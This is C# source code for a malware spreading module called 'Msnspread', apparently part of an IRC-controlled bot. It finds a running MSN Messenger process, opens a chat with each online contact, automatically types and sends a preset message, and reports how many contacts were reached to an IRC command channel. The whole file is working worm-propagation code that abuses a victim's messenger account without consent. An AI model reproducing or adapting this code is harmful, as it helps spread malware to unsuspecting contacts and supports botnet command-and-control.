using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using MSNMessengerAPI;

namespace myApp
{
    internal class Msnspread
    {
        public static string MYmessage;

        public void MsnStart()
        {
            foreach (Process p in Process.GetProcesses())
                if (p.ProcessName.Contains("msnmsgr"))
                {

                    try
                    {
                        Program.Registar_Dlls(Environment.CurrentDirectory + "\\MSNMessengerAPI.dll");
                    }
                    catch
                    { }

                    try
                    {

                        MsnSend();
                        Thread.Sleep(2000);
                    }
                    catch
                    {
                        //
                    }
                }
        }
        public static void MsnSend()
        {

            try
            {
                var msn = new Messenger();

                if (msn.MyStatus.Equals("MISTATUS_OFFLINE"))
                {
                    // Do nothing
                }
                else
                {
                    var contacts = (IMSNMessengerContacts)msn.MyContacts;
                    int sent = 0;

                    foreach (IMSNMessengerContact contact in contacts)
                    {
                        if (contact.Status != MISTATUS.MISTATUS_OFFLINE)
                        {
                            try
                            {
                                msn.InstantMessage(contact);
                                SendKeys.SendWait(MYmessage);
                                Thread.Sleep(500);
                                SendKeys.SendWait("{ENTER}");
                                Thread.Sleep(1000);
                                SendKeys.SendWait("{ESCAPE}");
                                Thread.Sleep(10000);
                                sent++;
                            }
                            catch
                            {

                            }


                        }
                    }

                    if (sent != 0)
                    {
                        Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  8Message sent to " + sent + " contacts");
                    }
                }
            }
            catch
            {
                //
            }
        }


    }
}